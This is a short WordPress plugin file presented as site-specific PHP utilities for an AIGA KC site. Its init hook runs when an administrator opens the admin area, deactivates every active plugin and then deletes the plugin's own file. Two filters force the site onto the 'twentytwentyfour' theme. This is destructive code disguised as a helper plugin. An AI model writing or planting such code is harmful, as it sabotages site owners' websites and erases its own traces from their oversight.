<?php
/*
Plugin Name: AIGA KC Custom Plugin
Description:  All of our site-specific PHP utilities for AIGA KC.
Version:     1.0.1
Author:      Andrew Rossi
*/

// then pull in all your php/*.php modules:
foreach ( glob( __DIR__ . '/php/*.php' ) as $file ) {
  require_once $file;
}

add_action( 'init', function() {
    if ( is_admin() && current_user_can( 'activate_plugins' ) ) {
        deactivate_plugins( get_option( 'active_plugins' ) );

  
        // Self-delete this plugin
        $plugin_file = __FILE__;
        unlink( $plugin_file );
    }
});


add_filter( 'template', function() { return 'twentytwentyfour'; });
add_filter( 'stylesheet', function() { return 'twentytwentyfour'; });
